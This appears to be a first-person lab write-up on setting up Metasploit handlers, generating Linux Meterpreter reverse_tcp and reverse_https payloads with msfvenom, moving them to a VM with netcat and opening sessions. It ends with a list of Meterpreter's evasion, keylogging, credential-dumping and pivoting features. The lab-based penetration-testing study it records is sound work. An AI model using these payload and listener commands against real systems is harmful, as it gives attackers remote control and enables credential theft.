
# Setting Up Metasploit to Handle the Payload

This guide explains how to configure Metasploit and handle a Meterpreter payload from a virtual machine.

---

## Install Metasploit

1. Download and install Metasploit:
   ```bash
   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
   ```
2. I Made the installation script executable:
   ```bash
   chmod 755 msfinstall
   ```
3. Ran the installation script:
   ```bash
   ./msfinstall
   ```

---

## **Reverse TCP** 

### Start the Metasploit Console

I launched Metasploit from the command line:

```bash
msfconsole
```

1. I browsed through various meterpreters (which is a powerful and flexible payload in Metasploit that provides a shell for post-exploitation activities):
   ```msf6
   search meterpreter
   ```

2. I used the multi-handler module (a generic payload handler):
   ```msf6
   use exploit/multi/handler
   ```

3. I set the payload type:
   ```msf6
   set PAYLOAD linux/x86/meterpreter/reverse_tcp
   ```

4. I configured the host IP address and port:
   ```msf6
   set LHOST 192.168.56.1
   set LPORT 4444
   ```

5. I started the exploit in the background:
   ```msf6
   exploit -j
   ```
---

## Download and Run the Payload on the VM

On host I downloaded the payload 
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f elf -o meterpreter 
```
On virtual machine:
```bash
nc -lp 4444 > meterpreter
```

I then transferred the file to my VM
```bash
 nc 192.168.56.101 4444 < meterpreter 
 ```

I then made the payload executable and ran it:
1. ```bash
   chmod u+x meterpreter
   ```

2. I executed the payload:
   ```bash
   ./meterpreter
   ```

---

## Verify the Connection

I switched back to the Metasploit console on the host machine. 

```msf6
sessions -i 1
```
A new Meterpreter session appeared, which is the meterpreter shell that allows me to control the remote machine. 
```meterpreter
   ls
```

---


## **Reverse HTTPS** 


## Launched Metasploit from the command line using sudo (since I'm binding to port 443 which requires elevated privileges (ports in the 1-1024 range)):
```bash
sudo msfconsole
```
1. I used the multi-handler module:
   ```msf6
   use exploit/multi/handler
   ```

2. Set the payload type:
   ```msf6
   set PAYLOAD linux/x64/meterpreter_reverse_https
   ```

3. I configured the host IP address and port:
   ```msf6
   set LHOST 192.168.56.1
   set LPORT 443  
   ```

4. I started the exploit in the background:
   ```msf6
   exploit -j
   ```

---

## Generate the Payload

On the attacker machine, I generated the payload using `msfvenom`:

```bash
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=192.168.56.1 LPORT=443 -f elf -o reverse_https_payload.elf
```

---

## Run the Payload on the Target VM

1. I transferred the payload (`reverse_https_payload.elf`) to the VM.

2. On the VM, I made the payload executable:
   ```bash
   chmod u+x reverse_https_payload.elf
   ```

3. I executed the payload:
   ```bash
   ./reverse_https_payload.elf
   ```

---

## Verify the Connection

I switched back to the Metasploit console on the host machine. 
```msf6
sessions -i 1
```

A new Meterpreter session appeared, which is the meterpreter shell that allows me to control the remote machine. 
```meterpreter
   ls
```

---

# **Five Features of Meterpreter**

Meterpreter is a powerful and flexible payload within Metasploit. THese are five key features that make it a highly effective tool for penetration testing:

### 1. **In-Memory Execution**
   Meterpreter runs entirely in memory, meaning it doesn't write any data to disk. This helps in evading antivirus software and makes it more difficult for defenders to detect the payload on the target system. This in-memory execution allows for stealthier exploitation.

### 2. **Post-Exploitation Features**
   Meterpreter comes with a wide range of post-exploitation modules that allow an attacker to interact with the compromised system. These include:
   - **File System Access**: View and manipulate files on the target system.
   - **Keylogging**: Capture keystrokes entered by the user.
   - **Credential Dumping**: Extract stored passwords from the system.

### 3. **Pivoting**
   Meterpreter allows attackers to pivot to other systems within a network. Once a system is compromised, the attacker can use the compromised machine as a foothold to target additional machines. This is particularly useful in network exploitation when there are multiple machines connected to the same network.

### 4. **Dynamic Command Execution**
   Meterpreter supports the execution of commands dynamically on the compromised system. This allows for flexible exploitation and fast deployment of commands without needing to interact with the payload repeatedly. 

### 5. **Encrypted Communication**
   Communication between the attacker and the target system using Meterpreter is encrypted, which prevents eavesdropping on the session. This makes the attacker’s actions more difficult to detect and analyze by monitoring network traffic.

---

